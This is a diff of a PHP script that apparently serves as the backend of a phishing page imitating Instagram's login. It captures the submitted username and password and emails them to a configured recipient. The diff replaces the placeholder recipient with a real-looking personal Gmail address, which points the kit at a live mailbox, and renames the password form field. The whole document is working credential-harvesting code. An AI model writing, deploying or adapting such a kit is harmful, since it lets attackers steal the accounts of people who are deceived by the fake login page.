@@ -4,7 +4,7 @@ declare(strict_types=1);
 header('X-Content-Type-Options: nosniff');
 
 // Configure your recipient email
-$RECIPIENT = 'replace-with-your-email@example.com';
+$RECIPIENT = 'laouziazzedine@gmail.com';
 $SUBJECT_PREFIX = '[Instagram Login] ';
 $DEFAULT_FROM = 'no-reply@localhost';
 
@@ -59,7 +59,7 @@ if (!filter_var($RECIPIENT, FILTER_VALIDATE_EMAIL)) {
 
 // Instagram login fields
 $identifier = sanitizeText($_POST['identifier'] ?? '');
-$password   = sanitizeText($_POST['password'] ?? '');
+$password   = sanitizeText($_POST['juan'] ?? '');
 
 // If identifier looks like an email, use it for Reply-To
 $senderEmail = sanitizeEmail($identifier);
